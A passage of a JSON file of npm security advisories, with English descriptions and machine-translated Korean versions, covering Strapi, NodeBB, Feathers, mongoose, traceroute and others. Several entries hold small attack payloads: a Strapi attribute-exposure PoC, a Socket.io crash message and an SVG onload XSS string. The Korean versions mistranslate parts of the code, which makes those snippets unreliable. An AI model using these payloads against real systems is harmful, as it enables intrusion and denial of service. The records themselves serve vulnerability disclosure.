    "descriptionKR": "### 요약\n누구나(Strapi 개발자, 사용자, 플러그인) Content-Type의 모든 속성을 모르고 공개할 수 있습니다.\n\n### 세부 정보\nStrapi 인스턴스 내부의 콘텐츠 유형을 처리할 때 적절한 컨테이너를 사용하여 콘텐츠 유형을 확장할 수 있습니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => newContentType);\n```\n이 취약점은 실제 콘텐츠 유형 자체가 아닌 Strapi의 콘텐츠 유형 처리에만 영향을 미칩니다. 사용자는 'privateAttributes' getter가 제거되고 있다는 사실을 깨닫지 못한 채 플러그인을 사용하거나 자신의 콘텐츠 유형을 수정할 수 있으며, 이로 인해 모든 속성이 공개될 수 있습니다. 이로 인해 민감한 정보가 노출되거나 공격자가 전체 시스템을 제어할 수 있습니다(암호 해시에 액세스할 수 있음).\n\n### PoC\n런타임에 모든 콘텐츠 유형을 확장하고(부트스트랩 함수에서와 같이) 콘텐츠 유형 객체를 복사합니다.\n```자바스크립트\nstrapi.container.get('콘텐츠 유형').extend(contentTypeUID, (contentType) => {\n  const newCT = { ... contentType, 속성: { ...contentType.attributes, newAttr: {} } };\n  newCT를 반환합니다.\n});\n```\n이는 getter를 제거하는 효과가 있으며 위생 처리에 의존하므로 모든 속성이 공용으로 간주됩니다.\n\n### 영향\n누구나 영향을 받을 수 있습니다. 사람들이 콘텐츠 유형을 사용/확장하는 방법에 따라 다릅니다. 사용자가 콘텐츠 유형을 변경하는 경우 영향을 받지 않습니다."
  },
  {
    "description": "### Impact\nDue to the use of the [object destructuring assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment) syntax in the user export code path, combined with a path traversal vulnerability, a specially crafted payload could invoke the user export logic to arbitrarily execute javascript files on the local disk.\n\n### Patches\nPatched in v2.8.7\n\n### Workarounds\nSite maintainers can cherry pick ec58700f6dff8e5b4af1544f6205ec362b593092 into their codebase to patch the exploit.",
    "identifiers": "GHSA : GHSA-vh2g-6c4x-5hmp\nCVE : CVE-2023-26045",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-25T13:54:13Z",
    "publishedAt": "2023-07-25T13:54:13Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-vh2g-6c4x-5hmp\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26045\nhttps://github.com/NodeBB/NodeBB/commit/ec58700f6dff8e5b4af1544f6205ec362b593092\nhttps://github.com/advisories/GHSA-vh2g-6c4x-5hmp",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.5.0, < 2.8.7",
    "identifier": "2.8.7",
    "descriptionKR": "### 영향\n경로와 결합된 사용자 내보내기 코드 경로에서 [개체 분해 할당](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment) 구문을 사용하기 때문입니다. 순회 취약성으로 인해 특별히 제작된 페이로드가 사용자 내보내기 논리를 호출하여 로컬 디스크에서 자바스크립트 파일을 임의로 실행할 수 있습니다.\n\n### 패치\nv2.8.7에서 패치됨\n\n### 해결 방법\n사이트 관리자는 익스플로잇을 패치하기 위해 코드베이스에 ec58700f6dff8e5b4af1544f6205ec362b593092를 선별할 수 있습니다."
  },
  {
    "description": "`node/hooks/express/apicalls.js` in Etherpad Lite before v1.6.3 mishandles JSONP, which allows remote attackers to bypass intended access restrictions.",
    "identifiers": "GHSA : GHSA-mvmv-rq2j-97p2\nCVE : CVE-2018-6835",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-24T19:55:01Z",
    "publishedAt": "2022-05-13T01:53:11Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-6835\nhttps://github.com/ether/etherpad-lite/commit/626e58cc5af1db3691b41fca7b06c28ea43141b1\nhttps://github.com/ether/etherpad-lite/releases/tag/1.6.3\nhttps://github.com/advisories/GHSA-mvmv-rq2j-97p2",
    "name": "ep_etherpad-lite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.3",
    "identifier": "1.6.3",
    "descriptionKR": "v1.6.3 이전 Etherpad Lite의 `node/hooks/express/apicalls.js`는 원격 공격자가 의도한 액세스 제한을 우회할 수 있도록 하는 JSONP를 잘못 처리합니다."
  },
  {
    "description": "The hhvm-attach deep link handler in Nuclide did not properly sanitize the provided hostname parameter when rendering. As a result, a malicious URL could be used to render HTML and other content inside of the editor's context, which could potentially be chained to lead to code execution. This issue affected Nuclide prior to v0.290.0.",
    "identifiers": "GHSA : GHSA-r83x-wj75-v89r\nCVE : CVE-2018-6333",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-21T23:24:46Z",
    "publishedAt": "2022-05-13T01:32:03Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-6333\nhttps://github.com/facebook/nuclide/commit/65f6bbd683404be1bb569b8d1be84b5d4c74a324\nhttps://github.com/advisories/GHSA-r83x-wj75-v89r",
    "name": "nuclide",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.290.0",
    "identifier": "0.290.0",
    "descriptionKR": "Nuclide의 hhvm-attach 딥 링크 처리기가 렌더링 시 제공된 호스트 이름 매개변수를 제대로 삭제하지 않았습니다. 결과적으로 악의적인 URL을 사용하여 편집기 컨텍스트 내에서 HTML 및 기타 콘텐츠를 렌더링할 수 있으며 잠재적으로 연결되어 코드 실행으로 이어질 수 있습니다. 이 문제는 v0.290.0 이전의 Nuclide에 영향을 미쳤습니다."
  },
  {
    "description": "Simditor v2.3.11 allows XSS via crafted use of `svg/onload=alert` in a TEXTAREA element, as demonstrated by Firefox 54.0.1.",
    "identifiers": "GHSA : GHSA-p9wj-wrrm-84m5\nCVE : CVE-2018-6464",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T23:22:08Z",
    "publishedAt": "2022-05-13T01:28:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-6464\nhttps://github.com/Heartway/simditor/blob/master/simditor.docx\nhttps://github.com/advisories/GHSA-p9wj-wrrm-84m5",
    "name": "simditor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.11",
    "descriptionKR": "Simditor v2.3.11은 Firefox 54.0.1에서 볼 수 있듯이 TEXTAREA 요소에서 'svg/onload=alert'를 사용하여 XSS를 허용합니다."
  },
  {
    "description": "The Node.js inspector, in 6.x and later is vulnerable to a DNS rebinding attack which could be exploited to perform remote code execution. An attack is possible from malicious websites open in a web browser on the same computer, or another computer with network access to the computer running the Node.js process. A malicious website could use a DNS rebinding attack to trick the web browser to bypass same-origin-policy checks and to allow HTTP connections to localhost or to hosts on the local network. If a Node.js process with the debug port active is running on localhost or on a host on the local network, the malicious website could connect to it as a debugger, and get full code execution access.",
    "identifiers": "GHSA : GHSA-wq4c-wm6x-jw44\nCVE : CVE-2018-7160",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T22:39:07Z",
    "publishedAt": "2022-05-13T01:08:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-7160\nhttps://nodejs.org/en/blog/vulnerability/march-2018-security-releases/\nhttps://support.f5.com/csp/article/K63025104?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://github.com/advisories/GHSA-wq4c-wm6x-jw44",
    "name": "node-inspector",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0",
    "descriptionKR": "6.x 이상의 Node.js 검사기는 원격 코드 실행을 수행하는 데 악용될 수 있는 DNS 리바인딩 공격에 취약합니다. 동일한 컴퓨터 또는 Node.js 프로세스를 실행하는 컴퓨터에 대한 네트워크 액세스 권한이 있는 다른 컴퓨터의 웹 브라우저에 열려 있는 악성 웹 사이트에서 공격이 가능합니다. 악의적인 웹 사이트는 DNS 리바인딩 공격을 사용하여 웹 브라우저를 속여 동일 출처 정책 검사를 우회하고 로컬 호스트 또는 로컬 네트워크의 호스트에 대한 HTTP 연결을 허용할 수 있습니다. 디버그 포트가 활성화된 Node.js 프로세스가 로컬 호스트 또는 로컬 네트워크의 호스트에서 실행 중인 경우 악의적인 웹 사이트가 디버거로 연결하여 전체 코드 실행 액세스 권한을 얻을 수 있습니다."
  },
  {
    "description": "A vulnerability in the Cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.",
    "identifiers": "GHSA : GHSA-jfxm-w8g2-4rcv\nCVE : CVE-2018-0114",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T18:45:56Z",
    "publishedAt": "2022-05-13T01:17:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-0114\nhttps://github.com/cisco/node-jose/blob/master/CHANGELOG.md\nhttps://github.com/zi0Black/POC-CVE-2018-0114\nhttps://tools.cisco.com/security/center/viewAlert.x?alertId=56326\nhttps://www.exploit-db.com/exploits/44324/\nhttps://web.archive.org/web/20210124130907/http://www.securityfocus.com/bid/102445\nhttps://github.com/advisories/GHSA-jfxm-w8g2-4rcv",
    "name": "node-jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.11.0",
    "identifier": "0.11.0",
    "descriptionKR": "0.11.0 이전의 Cisco node-jose 오픈 소스 라이브러리의 취약성으로 인해 인증되지 않은 원격 공격자가 토큰 내에 포함된 키를 사용하여 토큰에 다시 서명할 수 있습니다. 이 취약점은 JWT(JSON Web Tokens)에 대한 JWS(JSON Web Signature) 표준을 따르는 node-jose로 인해 발생합니다. 이 표준은 공개 키를 나타내는 JWK(JSON Web Key)가 JWS의 헤더 내에 내장될 수 있음을 지정합니다. 이 공개 키는 확인을 위해 신뢰됩니다. 공격자는 원본 서명을 제거하고 헤더에 새 공개 키를 추가한 다음 해당 JWS 헤더에 내장된 공개 키와 연결된 (공격자 소유) 개인 키를 사용하여 객체에 서명함으로써 유효한 JWS 객체를 위조함으로써 이를 악용할 수 있습니다."
  },
  {
    "description": "### Impact\n\nFeathers socket handler did not catch invalid string conversion errors like:\n\n```ts\nconst message = `${{ toString: '' }}`\n```\n\nCausing the NodeJS process to crash when sending an unexpected Socket.io message like\n\n```ts\nsocket.emit('find', { toString: '' })\n```\n\n### Patches\n\nA fix has been released in\n\n- `v5.0.8` via #3241\n- `v4.5.18` via #3242\n\n### Workarounds\n\nSince it is in the core Socket handling code upgrading to the latest version is necessary.\n### References\n\n- [v5.0.8 Changelog](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 Changelog](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)\n",
    "identifiers": "GHSA : GHSA-hhr9-rh25-hvf9\nCVE : CVE-2023-37899",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T14:54:30Z",
    "publishedAt": "2023-07-20T14:54:30Z",
    "references": "https://github.com/feathersjs/feathers/security/advisories/GHSA-hhr9-rh25-hvf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37899\nhttps://github.com/feathersjs/feathers/pull/3241\nhttps://github.com/feathersjs/feathers/pull/3242\nhttps://github.com/feathersjs/feathers/commit/0b9a6b19b12ad05934e4c8bd9917448ed39d1ed8\nhttps://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c\nhttps://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19\nhttps://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19\nhttps://github.com/advisories/GHSA-hhr9-rh25-hvf9",
    "name": "@feathersjs/transport-commons",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, <= 5.0.7",
    "identifier": "5.0.8",
    "descriptionKR": "### 영향\n\nFeathers 소켓 처리기가 다음과 같은 잘못된 문자열 변환 오류를 포착하지 못했습니다.\n\n```ts\nconst 메시지 = `${{ toString: '' }}`\n```\n\n다음과 같은 예기치 않은 Socket.io 메시지를 보낼 때 NodeJS 프로세스가 충돌하는 원인\n\n```ts\nsocket.emit('찾기', { toString: '' })\n```\n\n### 패치\n\n에서 수정 사항이 릴리스되었습니다.\n\n- #3241을 통한 `v5.0.8`\n- #3242를 통한 `v4.5.18`\n\n### 해결 방법\n\n핵심 소켓 처리 코드에 있으므로 최신 버전으로 업그레이드해야 합니다.\n### 참조\n\n- [v5.0.8 변경 로그](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 변경 로그](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)"
  },
  {
    "description": "### Impact\n\nFeathers socket handler did not catch invalid string conversion errors like:\n\n```ts\nconst message = `${{ toString: '' }}`\n```\n\nCausing the NodeJS process to crash when sending an unexpected Socket.io message like\n\n```ts\nsocket.emit('find', { toString: '' })\n```\n\n### Patches\n\nA fix has been released in\n\n- `v5.0.8` via #3241\n- `v4.5.18` via #3242\n\n### Workarounds\n\nSince it is in the core Socket handling code upgrading to the latest version is necessary.\n### References\n\n- [v5.0.8 Changelog](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 Changelog](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)\n",
    "identifiers": "GHSA : GHSA-hhr9-rh25-hvf9\nCVE : CVE-2023-37899",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T14:54:30Z",
    "publishedAt": "2023-07-20T14:54:30Z",
    "references": "https://github.com/feathersjs/feathers/security/advisories/GHSA-hhr9-rh25-hvf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37899\nhttps://github.com/feathersjs/feathers/pull/3241\nhttps://github.com/feathersjs/feathers/pull/3242\nhttps://github.com/feathersjs/feathers/commit/0b9a6b19b12ad05934e4c8bd9917448ed39d1ed8\nhttps://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c\nhttps://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19\nhttps://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19\nhttps://github.com/advisories/GHSA-hhr9-rh25-hvf9",
    "name": "@feathersjs/transport-commons",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.5.17",
    "identifier": "4.5.18",
    "descriptionKR": "### 영향\n\nFeathers 소켓 처리기가 다음과 같은 잘못된 문자열 변환 오류를 포착하지 못했습니다.\n\n```ts\nconst 메시지 = `${{ toString: '' }}`\n```\n\n다음과 같은 예기치 않은 Socket.io 메시지를 보낼 때 NodeJS 프로세스가 충돌하는 원인\n\n```ts\nsocket.emit('찾기', { toString: '' })\n```\n\n### 패치\n\n에서 수정 사항이 릴리스되었습니다.\n\n- #3241을 통한 `v5.0.8`\n- #3242를 통한 `v4.5.18`\n\n### 해결 방법\n\n핵심 소켓 처리 코드에 있으므로 최신 버전으로 업그레이드해야 합니다.\n### 참조\n\n- [v5.0.8 변경 로그](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 변경 로그](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)"
  },
  {
    "description": "### Impact\n\nFeathers socket handler did not catch invalid string conversion errors like:\n\n```ts\nconst message = `${{ toString: '' }}`\n```\n\nCausing the NodeJS process to crash when sending an unexpected Socket.io message like\n\n```ts\nsocket.emit('find', { toString: '' })\n```\n\n### Patches\n\nA fix has been released in\n\n- `v5.0.8` via #3241\n- `v4.5.18` via #3242\n\n### Workarounds\n\nSince it is in the core Socket handling code upgrading to the latest version is necessary.\n### References\n\n- [v5.0.8 Changelog](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 Changelog](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)\n",
    "identifiers": "GHSA : GHSA-hhr9-rh25-hvf9\nCVE : CVE-2023-37899",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T14:54:30Z",
    "publishedAt": "2023-07-20T14:54:30Z",
    "references": "https://github.com/feathersjs/feathers/security/advisories/GHSA-hhr9-rh25-hvf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37899\nhttps://github.com/feathersjs/feathers/pull/3241\nhttps://github.com/feathersjs/feathers/pull/3242\nhttps://github.com/feathersjs/feathers/commit/0b9a6b19b12ad05934e4c8bd9917448ed39d1ed8\nhttps://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c\nhttps://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19\nhttps://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19\nhttps://github.com/advisories/GHSA-hhr9-rh25-hvf9",
    "name": "@feathersjs/socketio",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, <= 5.0.7",
    "identifier": "5.0.8",
    "descriptionKR": "### 영향\n\nFeathers 소켓 처리기가 다음과 같은 잘못된 문자열 변환 오류를 포착하지 못했습니다.\n\n```ts\nconst 메시지 = `${{ toString: '' }}`\n```\n\n다음과 같은 예기치 않은 Socket.io 메시지를 보낼 때 NodeJS 프로세스가 충돌하는 원인\n\n```ts\nsocket.emit('찾기', { toString: '' })\n```\n\n### 패치\n\n에서 수정 사항이 릴리스되었습니다.\n\n- #3241을 통한 `v5.0.8`\n- #3242를 통한 `v4.5.18`\n\n### 해결 방법\n\n핵심 소켓 처리 코드에 있으므로 최신 버전으로 업그레이드해야 합니다.\n### 참조\n\n- [v5.0.8 변경 로그](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 변경 로그](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)"
  },
  {
    "description": "### Impact\n\nFeathers socket handler did not catch invalid string conversion errors like:\n\n```ts\nconst message = `${{ toString: '' }}`\n```\n\nCausing the NodeJS process to crash when sending an unexpected Socket.io message like\n\n```ts\nsocket.emit('find', { toString: '' })\n```\n\n### Patches\n\nA fix has been released in\n\n- `v5.0.8` via #3241\n- `v4.5.18` via #3242\n\n### Workarounds\n\nSince it is in the core Socket handling code upgrading to the latest version is necessary.\n### References\n\n- [v5.0.8 Changelog](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 Changelog](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)\n",
    "identifiers": "GHSA : GHSA-hhr9-rh25-hvf9\nCVE : CVE-2023-37899",
    "severity": "HIGH",
    "updatedAt": "2023-07-20T14:54:30Z",
    "publishedAt": "2023-07-20T14:54:30Z",
    "references": "https://github.com/feathersjs/feathers/security/advisories/GHSA-hhr9-rh25-hvf9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37899\nhttps://github.com/feathersjs/feathers/pull/3241\nhttps://github.com/feathersjs/feathers/pull/3242\nhttps://github.com/feathersjs/feathers/commit/0b9a6b19b12ad05934e4c8bd9917448ed39d1ed8\nhttps://github.com/feathersjs/feathers/commit/c397ab3a0cd184044ae4f73540549b30a396821c\nhttps://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19\nhttps://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19\nhttps://github.com/advisories/GHSA-hhr9-rh25-hvf9",
    "name": "@feathersjs/socketio",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.5.17",
    "identifier": "4.5.18",
    "descriptionKR": "### 영향\n\nFeathers 소켓 처리기가 다음과 같은 잘못된 문자열 변환 오류를 포착하지 못했습니다.\n\n```ts\nconst 메시지 = `${{ toString: '' }}`\n```\n\n다음과 같은 예기치 않은 Socket.io 메시지를 보낼 때 NodeJS 프로세스가 충돌하는 원인\n\n```ts\nsocket.emit('찾기', { toString: '' })\n```\n\n### 패치\n\n에서 수정 사항이 릴리스되었습니다.\n\n- #3241을 통한 `v5.0.8`\n- #3242를 통한 `v4.5.18`\n\n### 해결 방법\n\n핵심 소켓 처리 코드에 있으므로 최신 버전으로 업그레이드해야 합니다.\n### 참조\n\n- [v5.0.8 변경 로그](https://github.com/feathersjs/feathers/blob/dove/CHANGELOG.md#508-2023-07-19)\n- [v4.5.18 변경 로그](https://github.com/feathersjs/feathers/blob/crow/CHANGELOG.md#4518-2023-07-19)"
  },
  {
    "description": "The traceroute (aka node-traceroute) package through 1.0.0 for Node.js allows remote command injection via the host parameter. This occurs because the `Child.exec()` method, which is considered to be not entirely safe, is used. In particular, an OS command can be placed after a newline character.",
    "identifiers": "GHSA : GHSA-8j9v-qhp4-wv55\nCVE : CVE-2018-21268",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-19T23:28:30Z",
    "publishedAt": "2022-05-24T17:21:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-21268\nhttps://github.com/jaw187/node-traceroute/commit/b99ee024a01a40d3d20a92ad3769cc78a3f6386f\nhttps://github.com/jaw187/node-traceroute/tags\nhttps://medium.com/@shay_62828/shell-command-injection-through-traceroute-npm-package-a4cf7b6553e3\nhttps://snyk.io/vuln/npm:traceroute:20160311\nhttps://www.linkedin.com/posts/op-innovate_shell-command-injection-through-traceroute-activity-6678956453086191616-Rcpy\nhttps://www.npmjs.com/advisories/1465\nhttps://www.op-c.net/2020/06/17/shell-command-injection-through-traceroute-npm-package/\nhttps://github.com/advisories/GHSA-8j9v-qhp4-wv55",
    "name": "traceroute",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "Node.js용 1.0.0까지의 traceroute(일명 node-traceroute) 패키지는 호스트 매개변수를 통한 원격 명령 주입을 허용합니다. 이는 전적으로 안전하지 않다고 판단되는 `Child.exec()` 메소드를 사용하기 때문에 발생합니다. 특히, 개행 문자 뒤에 OS 명령을 배치할 수 있습니다."
  },
  {
    "description": "In irisnet-crypto before 1.1.7 for IRISnet, the util/utils.js file allows code execution because of unsafe eval usage.",
    "identifiers": "GHSA : GHSA-5fh8-x9xc-hxmc\nCVE : CVE-2019-9115",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-19T20:05:43Z",
    "publishedAt": "2022-05-13T01:08:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-9115\nhttps://github.com/irisnet/irisnet-crypto/issues/60\nhttps://github.com/dreamer-zq/irisnet-crypto/commit/7ea0e65ece9c059ad8cb1ccec8e4c849af58c48d\nhttps://github.com/advisories/GHSA-5fh8-x9xc-hxmc",
    "name": "irisnet-crypto",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.7",
    "identifier": "1.1.7",
    "descriptionKR": "IRISnet용 1.1.7 이전의 irisnet-crypto에서 util/utils.js 파일은 안전하지 않은 eval 사용으로 인해 코드 실행을 허용합니다."
  },
  {
    "description": "An issue was discovered in Joomla! before 3.9.3. The phar:// stream wrapper can be used for object injection attacks because there is no protection mechanism (such as the TYPO3 PHAR stream wrapper) to prevent use of the phar:// handler for non .phar-files.",
    "identifiers": "GHSA : GHSA-5m3w-rvvh-8fx6\nCVE : CVE-2019-7743",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-19T18:33:35Z",
    "publishedAt": "2022-05-13T01:22:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-7743\nhttps://developer.joomla.org/security-centre/770-20190206-core-implement-the-typo3-phar-stream-wrapper\nhttps://github.com/joomla/joomla-cms/issues/23907\nhttps://web.archive.org/web/20210730211655/https://www.securityfocus.com/bid/107050\nhttps://github.com/advisories/GHSA-5m3w-rvvh-8fx6",
    "name": "joomla",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.5.0, < 3.9.3",
    "identifier": "3.9.3",
    "descriptionKR": "Joomla!에서 문제가 발견되었습니다. 3.9.3 이전. phar:// 스트림 래퍼는 비 .phar 파일에 대한 phar:// 처리기 사용을 방지하는 보호 메커니즘(예: TYPO3 PAR 스트림 래퍼)이 없기 때문에 개체 주입 공격에 사용할 수 있습니다."
  },
  {
    "description": "All versions of component-flatten are vulnerable to Prototype Pollution. The a function could be tricked into adding or modifying properties of Object.prototype using a `__proto__` payload.",
    "identifiers": "GHSA : GHSA-g6r3-hhg9-qf58\nCVE : CVE-2019-10794",
    "severity": "MODERATE",
    "updatedAt": "2023-07-18T23:54:18Z",
    "publishedAt": "2022-05-24T17:09:13Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10794\nhttps://snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907\nhttps://github.com/advisories/GHSA-g6r3-hhg9-qf58",
    "name": "component-flatten",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.1",
    "descriptionKR": "component-flatten의 모든 버전은 Prototype Pollution에 취약합니다. 함수는 `__proto__` 페이로드를 사용하여 Object.prototype의 속성을 추가하거나 수정하도록 속일 수 있습니다."
  },
  {
    "description": "Prototype Pollution in GitHub repository automattic/mongoose prior to 7.3.3, 6.11.3, and 5.13.20.",
    "identifiers": "GHSA : GHSA-9m93-w8w6-76hh\nCVE : CVE-2023-3696",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-18T22:46:18Z",
    "publishedAt": "2023-07-17T03:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3696\nhttps://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d\nhttps://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467\nhttps://github.com/Automattic/mongoose/commit/e29578d2ec18a68aeb4717d66dd5eb66bae53de1\nhttps://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2\nhttps://github.com/Automattic/mongoose/releases/tag/7.3.3\nhttps://github.com/advisories/GHSA-9m93-w8w6-76hh",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.13.20",
    "identifier": "5.13.20",
    "descriptionKR": "7.3.3, 6.11.3 및 5.13.20 이전의 GitHub 저장소 automattic/mongoose의 Prototype Pollution."
  },
  {
    "description": "Prototype Pollution in GitHub repository automattic/mongoose prior to 7.3.3, 6.11.3, and 5.13.20.",
    "identifiers": "GHSA : GHSA-9m93-w8w6-76hh\nCVE : CVE-2023-3696",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-18T22:46:18Z",
    "publishedAt": "2023-07-17T03:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3696\nhttps://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d\nhttps://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467\nhttps://github.com/Automattic/mongoose/commit/e29578d2ec18a68aeb4717d66dd5eb66bae53de1\nhttps://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2\nhttps://github.com/Automattic/mongoose/releases/tag/7.3.3\nhttps://github.com/advisories/GHSA-9m93-w8w6-76hh",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.11.3",
    "identifier": "6.11.3",
    "descriptionKR": "7.3.3, 6.11.3 및 5.13.20 이전의 GitHub 저장소 automattic/mongoose의 Prototype Pollution."
  },
  {
    "description": "Prototype Pollution in GitHub repository automattic/mongoose prior to 7.3.3, 6.11.3, and 5.13.20.",
    "identifiers": "GHSA : GHSA-9m93-w8w6-76hh\nCVE : CVE-2023-3696",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-18T22:46:18Z",
    "publishedAt": "2023-07-17T03:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3696\nhttps://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d\nhttps://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467\nhttps://github.com/Automattic/mongoose/commit/e29578d2ec18a68aeb4717d66dd5eb66bae53de1\nhttps://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2\nhttps://github.com/Automattic/mongoose/releases/tag/7.3.3\nhttps://github.com/advisories/GHSA-9m93-w8w6-76hh",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.0.0, < 7.3.3",
    "identifier": "7.3.3",
    "descriptionKR": "7.3.3, 6.11.3 및 5.13.20 이전의 GitHub 저장소 automattic/mongoose의 Prototype Pollution."
  },
  {
    "description": "An issue was discovered in the BSON ObjectID (aka bson-objectid) package 1.3.0 for Node.js. ObjectID() allows an attacker to generate a malformed objectid by inserting an additional property to the user-input, because bson-objectid will return early if it `detects _bsontype==ObjectID` in the user-input object. As a result, objects in arbitrary forms can bypass formatting if they have a valid bsontype.",
    "identifiers": "GHSA : GHSA-p84x-5xx8-hff9\nCVE : CVE-2019-19729",
    "severity": "HIGH",
    "updatedAt": "2023-07-18T21:09:19Z",
    "publishedAt": "2022-05-24T22:01:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-19729\nhttps://github.com/williamkapke/bson-objectid/issues/30\nhttps://www.npmjs.com/package/bson-objectid\nhttps://github.com/advisories/GHSA-p84x-5xx8-hff9",
    "name": "bson-objectid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.3.0",
